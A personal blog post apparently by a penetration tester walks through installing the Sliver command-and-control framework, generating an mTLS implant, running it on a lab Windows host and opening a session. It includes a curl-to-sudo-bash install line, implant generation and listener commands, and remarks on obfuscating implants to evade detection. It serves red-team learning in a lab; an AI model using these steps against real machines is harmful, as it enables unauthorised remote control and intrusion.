---
layout: post
title: "The Sliver C2 Installation and Demo"
subtitle: "~ Time to lean into C2's ~"
date: 2023-10-09
author: ha3ks
category: blog post
tags: blog ctf pentesting c2 sliver
finished: true
excerpt_separator: <!--more-->
---

[![1](\img\blog\sliver_C2\1.png)](\img\blog\sliver_C2\1.png)

Sliver (the C2). You have heard of it, you have seen it, hell you could even be an expert in it's use but if you are anything like me you have seen 'C2' and thought 'that would be cool' and then never got around to even trying it.

Well look no further, I am here to show you how easy it is to get running and get rolling, so let's get right into it!

<!--more-->

First things first, we need to bust open a terminal and head over to where you want to run the install, the majority of the time this will be '/opt' in Kali (/opt is used for installing third party packages and it pays to keep things 'uniform'):

```
cd /opt
```

After that we want to get a copy of Sliver onto our machine. Handily as Bishop Fox put it all online in a tidy git repo it allows us to do a quick little git clone and we are away:

```
sudo git clone https://github.com/BishopFox/sliver.git
```

This latest version (1.6.0 at time of writing) features: 

* Dynamic code generation
* Compile-time obfuscation
* Multiplayer-mode
* Staged and Stageless payloads
* Procedurally generated C2 over HTTP(S)
* DNS canary blue team detection
* Secure C2 over mTLS, WireGuard, HTTP(S), and DNS
* Fully scriptable using JavaScript/TypeScript or Python
* Windows process migration, process injection, user token manipulation, etc.
* Let's Encrypt integration
* In-memory .NET assembly execution
* COFF/BOF in-memory loader
* TCP and named pipe pivots
* Much more!

Once downloaded an 'ls' comnand should show a 'sliver' folder now in our /opt folder.

[![2](\img\blog\sliver_C2\2.png)](\img\blog\sliver_C2\2.png)

Now we can navigate into the sliver folder:

```
cd sliver
```

Next tesk is to run the installation for sliver, this is a handy oneliner shown on the README for sliver does the job for us:

```
curl https://sliver.sh/install|sudo bash
```

Finally you can run sliver by entering 'sliver' into the terminal (this works in any directory BTW, it's 'global' so you could open a terminal anywhere and type in 'sliver' and get going).

[![3](\img\blog\sliver_C2\3.png)](\img\blog\sliver_C2\3.png)

Ok, so that wasn't so hard.

As with all tooling if you are unsure how to us it.... just run the 'help' command:

```
sliver > help

Commands:
=========
  clear       clear the screen
  exit        exit the shell
  help        use 'help [command]' for command help
  monitor     Monitor threat intel platforms for Sliver implants
  wg-config   Generate a new WireGuard client config
  wg-portfwd  List ports forwarded by the WireGuard tun interface
  wg-socks    List socks servers listening on the WireGuard tun interface


Generic:
========
  aliases           List current aliases
  armory            Automatically download and install extensions/aliases
  background        Background an active session
  beacons           Manage beacons
  builders          List external builders
  canaries          List previously generated canaries
  cursed            Chrome/electron post-exploitation tool kit (∩｀-´)⊃━☆ﾟ.*･｡ﾟ
  dns               Start a DNS listener
  env               List environment variables
  generate          Generate an implant binary
  hosts             Manage the database of hosts
  http              Start an HTTP listener
  https             Start an HTTPS listener
  implants          List implant builds
  jobs              Job control
  licenses          Open source licenses
  loot              Manage the server's loot store
  mtls              Start an mTLS listener
  prelude-operator  Manage connection to Prelude's Operator
  profiles          List existing profiles
  reaction          Manage automatic reactions to events
  regenerate        Regenerate an implant
  sessions          Session management
  settings          Manage client settings
  stage-listener    Start a stager listener
  tasks             Beacon task management
  update            Check for updates
  use               Switch the active session or beacon
  version           Display version information
  websites          Host static content (used with HTTP C2)
  wg                Start a WireGuard listener


Multiplayer:
============
  operators  Manage operators


For even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki
```

Now remember I am not an expert here I am just playing around to test it's functionality.

Having done some of the Red Team Operator Certification from ZeroPoint Security I am familiar with using Cobalt Strike, so the next step would be generating some kind of Beacon or Implant, getting it over to a victim machine and connecting to it.

To generate a generic implant we can use:

```
generate --mtls <your ip> --arch <OS type> --save <output directory>
```

[![4](\img\blog\sliver_C2\4.png)](\img\blog\sliver_C2\4.png)

Once complete it will have created a payload in your desired location, as I can drag and drop I picked my desktop (above) though if you wanted to you could spin up a HTTP server on your attacker machine and navigate to the address on your victim and download it.

[![5](\img\blog\sliver_C2\5.png)](\img\blog\sliver_C2\5.png)

Neat!

Also it's worth noting that the implant that has been generated is hefty... 

[![6](\img\blog\sliver_C2\6.png)](\img\blog\sliver_C2\6.png)

I'm entirely sure there are ways to shrink this down to a more manageable size and as such less detectable but I just want to get it working and size doesn't matter...

Now that the implant is on the machine we need to get Sliver 'listening' for incoming requests by running 'mtls':

```
sliver > mtls
```

Ok, we have our C2 listening for a connection, we have our implant on the target... Let's see what happens when we run it:

[![7](\img\blog\sliver_C2\7.png)](\img\blog\sliver_C2\7.png)

*Clicks Run*

It has successfully executed on the victim and we can even see it in the task manager:

[![8](\img\blog\sliver_C2\8.png)](\img\blog\sliver_C2\8.png)

Also on the Kali side, we can see Sliver has picked up the new connection:

[![9](\img\blog\sliver_C2\9.png)](\img\blog\sliver_C2\9.png)

Hooked!

# Now What?

Well now we can view 'sessions' and confirm the machine is accessable:

```
sliver > sessions

 ID         Transport   Remote Address          Hostname       Username              Operating System   Health  
========== =========== ======================= ============== ===================== ================== =========
 c1c1758c   mtls        192.168.197.129:60896   CORP-CLIENT1   HA3KS\Administrator   windows/386        [ALIVE] 
```

We can interact with a session by entering it's ID much like Meterpreter:

```
sessions -i c1c1758c
```

And finally, get a little bit of recon going:

[![10](\img\blog\sliver_C2\10.png)](\img\blog\sliver_C2\10.png)

It's as easy as that!

Now again you can do more with this and get things a little better obfuscated. For giggles I put the .exe into VirusTotal:

[![11](\img\blog\sliver_C2\11.png)](\img\blog\sliver_C2\11.png)

Ouch!

Good for a demo though.

Now you might be thinking "oh he's using Kali Linux, he's cheating" well, ok this is Sliver running on Ubuntu 22.04.3 LTS:

[![12](\img\blog\sliver_C2\12.png)](\img\blog\sliver_C2\12.png)

Parrot Security Edition 5.3:

[![13](\img\blog\sliver_C2\13.png)](\img\blog\sliver_C2\13.png)

Hehehe 'PROVINCIAL_BIKINI'

It works if you will it to... I wanted to try Hannah Montana Linux but since ubuntu took down the old versions of jammy it can't update anymore.. I'm sure with some time and further effort I could get it to upgrade and as such get Sliver running on it... Maybe a job for another day.

I hope this has been helpful/educational to people.

Be Safe 🤙

-------

I don't have any sponsors or anything but if you enjoy my work, or feel sympathy for my wife, then I have set up a [Ko-Fi account](https://ko-fi.com/ha3ks) as well as a [BuyMeACoffee](https://www.buymeacoffee.com/ha3ks) people can donate to.